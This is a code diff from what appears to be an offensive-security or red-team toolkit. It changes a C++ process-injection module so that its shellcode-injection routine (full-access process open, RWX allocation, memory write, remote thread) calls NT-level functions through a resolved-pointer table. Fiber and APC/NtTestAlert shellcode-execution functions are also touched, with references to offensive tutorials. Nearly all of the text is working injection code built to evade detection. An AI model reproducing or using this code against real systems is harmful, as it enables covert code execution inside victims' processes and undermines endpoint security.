@@ -2,72 +2,84 @@
 
 namespace Technique::Injection
 {
-    BOOL ShellcodeInjection(DWORD dwPID, const std::vector<BYTE>& shellcode)
+    BOOL ShellcodeInjection(Procs::PPROCS pProcs, DWORD dwPID, const std::vector<BYTE>& shellcode)
     {
         HANDLE hProcess;
         HANDLE hThread;
         PVOID remoteBuffer;
-        BOOL bResults;
 
-        hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
+        hProcess = System::Process::ProcessOpen(
+            pProcs,
+            dwPID,
+            PROCESS_ALL_ACCESS
+        );
         if (!hProcess)
         {
             return FALSE;
         }
 
-        remoteBuffer = VirtualAllocEx(
+        remoteBuffer = System::Process::VirtualMemoryAllocate(
+            pProcs,
             hProcess,
-            NULL,
             shellcode.size(),
             MEM_COMMIT | MEM_RESERVE,
             PAGE_EXECUTE_READWRITE
         );
         if (!remoteBuffer)
         {
-            CloseHandle(hProcess);
+            pProcs->lpNtClose(hProcess);
             return FALSE;
         }
 
-        if (!WriteProcessMemory(
+        if (!System::Process::VirtualMemoryWrite(
+            pProcs,
             hProcess,
             remoteBuffer,
-            shellcode.data(),
+            (LPVOID)shellcode.data(),
             shellcode.size(),
             NULL
         )) {
-            VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
-            CloseHandle(hProcess);
+            System::Process::VirtualMemoryFree(
+                pProcs,
+                hProcess,
+                &remoteBuffer,
+                0,
+                MEM_RELEASE
+            );
+            pProcs->lpNtClose(hProcess);
             return FALSE;
         }
 
-        hThread = CreateRemoteThreadEx(
+        hThread = System::Process::RemoteThreadCreate(
+            pProcs,
             hProcess,
-            NULL,
-            0,
             (LPTHREAD_START_ROUTINE)remoteBuffer,
-            NULL,
-            0,
-            NULL,
             NULL
         );
         if (!hThread)
         {
-            VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
-            CloseHandle(hProcess);
+            System::Process::VirtualMemoryFree(
+                pProcs,
+                hProcess,
+                &remoteBuffer,
+                0,
+                MEM_RELEASE
+            );
+            pProcs->lpNtClose(hProcess);
             return FALSE;
         }
 
-        WaitForSingleObject(hThread, INFINITE);
+        pProcs->lpNtWaitForSingleObject(hThread, FALSE, NULL);
 
-        CloseHandle(hProcess);
-        CloseHandle(hThread);
+        pProcs->lpNtClose(hProcess);
+        pProcs->lpNtClose(hThread);
 
         return TRUE;
     }
 
     // Reference:
     // https://www.ired.team/offensive-security/code-injection-process-injection/executing-shellcode-with-createfiber
-    BOOL ShellcodeExecutionViaFibers(const std::vector<BYTE>& shellcode)
+    BOOL ShellcodeExecutionViaFibers(Procs::PPROCS pProcs, const std::vector<BYTE>& shellcode)
     {
         // Convert the current thread into a fiber.
         PVOID mainFiber = ConvertThreadToFiber(NULL);
@@ -88,7 +100,7 @@ namespace Technique::Injection
 
     // Reference:
     // https://www.ired.team/offensive-security/code-injection-process-injection/shellcode-execution-in-a-local-process-with-queueuserapc-and-nttestalert
-    BOOL ShellcodeExecutionViaAPCAndNtTestAlert(const std::vector<BYTE>& shellcode)
+    BOOL ShellcodeExecutionViaAPCAndNtTestAlert(Procs::PPROCS pProcs, const std::vector<BYTE>& shellcode)
     {
         using MY_NTSTATUS = NTSTATUS(NTAPI*)();
 
